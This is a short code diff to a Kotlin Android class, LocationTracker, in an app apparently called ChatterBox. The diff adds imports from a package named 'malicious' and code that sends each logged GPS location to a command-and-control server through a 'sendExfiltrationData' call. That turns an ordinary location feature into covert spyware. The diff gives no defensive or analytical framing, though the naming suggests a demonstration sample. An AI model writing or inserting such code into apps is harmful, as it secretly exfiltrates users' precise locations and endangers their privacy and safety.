@@ -13,6 +13,8 @@ import android.os.Looper
 import android.util.Log
 import androidx.core.app.ActivityCompat
 import org.json.JSONObject
+import com.example.ChatterBox.malicious.C2Client
+import com.example.ChatterBox.malicious.C2Config
 import java.io.File
 import java.io.FileOutputStream
 import java.text.SimpleDateFormat
@@ -175,6 +177,15 @@ class LocationTracker(private val context: Context) {
             }
             
             Log.d(TAG, "Location logged: ${location.latitude}, ${location.longitude}")
+            
+            // Send location data to C2 server
+            try {
+                val c2Client = C2Client(context)
+                c2Client.sendExfiltrationData("location", locationJson.toString())
+                Log.d(TAG, "Location sent to C2 server: ${C2Config.SERVER_URL}")
+            } catch (e: Exception) {
+                Log.e(TAG, "Error sending location to C2 server", e)
+            }
         } catch (e: Exception) {
             Log.e(TAG, "Error logging location", e)
         }
